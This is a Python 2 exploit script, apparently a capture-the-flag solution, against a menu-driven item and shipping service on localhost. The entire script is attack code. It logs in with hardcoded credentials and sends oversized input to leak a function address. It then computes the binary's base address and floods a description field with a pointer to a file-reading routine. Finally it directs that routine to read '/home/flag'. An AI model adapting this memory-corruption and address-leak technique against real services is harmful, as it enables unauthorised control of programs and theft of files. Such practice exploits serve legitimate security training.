from socket import *
from struct import *
from time import *

ip='127.0.0.1'
port=1129

s=socket(AF_INET,SOCK_STREAM)
s.connect((ip,port))
def p32(x):
return pack('I',x)

def up32(x):
return unpack('I',x)[0]

base=""
read_file=''
function1=''
function1_offset=0x9ad
fileread_offset=0x8db

id='helloadmin'
pw='iulover!@#$'

#########################LOGIN#############################
print s.recv(1024)
s.send(id)
sleep(0.1)
print s.recv(1024)
s.send(pw)
sleep(0.1)
print s.recv(1024)

#########################Add new item#########################
s.send("1\n")
sleep(0.1)
print s.recv(1024)
s.send("zj3t"+"\n")
sleep(0.1)
print s.recv(1024)
s.send("zj3t"+"\n")
sleep(0.1)
print s.recv(1024)
s.send("0"+"\n")
sleep(0.1)
print s.recv(1024)

#########################Modify the item######################
s.send("2\n")
sleep(0.1)
print s.recv(1024)
s.send("0\n")
sleep(0.1)
print s.recv(1024)
s.send("3\n")
sleep(0.1)
print s.recv(1024)

s.send("2004318071"+"\n")
sleep(0.1)
print s.recv(1024)
s.send("2004318071"+"\n")
sleep(0.1)
print s.recv(1024)
s.send("1\n")
sleep(0.1)
print s.recv(1024)
s.send("0\n")
sleep(0.1)
print s.recv(1024)
s.send("A"*20+"\n")
print s.recv(1024)
s.send("B"*300+"\n")
sleep(0.1)
print s.recv(1024)

s.send("0\n")
sleep(0.1)
print s.recv(1024)

######################Show item list###############################
s.send("4\n")
sleep(0.1)
print s.recv(143)
function1=up32(s.recv(4))

base=function1-function1_offset
fileread=base+fileread_offset

####################Modify decription#############################
s.send("2\n")
print s.recv(1024)
s.send("0\n")
sleep(0.1)
print s.recv(1024)
s.send("2\n")
sleep(0.1)
print s.recv(1024)
s.send(p32(fileread)*750)
print s.recv(1024)

###################Modify information############################
s.send("3\n")
sleep(0.1)
print s.recv(1024)
s.send("1234\n")
sleep(0.1)
print s.recv(1024)
s.send("1234\n")
sleep(0.1)
print s.recv(1024)
s.send("0\n")
sleep(0.1)
print s.recv(1024)
s.send("1\n")
sleep(0.1)
print s.recv(1024)
s.send("/home/flag\00"+"\n")
sleep(0.1)
print s.recv(1024)
s.send('zj3t\n')
sleep(0.1)
print s.recv(1024)

####################Modify Shipping option#########################
s.send("4\n")
sleep(0.1)
print s.recv(1024)
s.send("1\n")
sleep(0.1)
print s.recv(1024)

###################Back to main menu!###########################
s.send("0\n")
sleep(0.1)
print s.recv(1024)

##################View item`s information########################
s.send("3\n")
sleep(0.1)
print s.recv(1024)
s.send("0\n")
sleep(0.1)
print s.recv(1024)
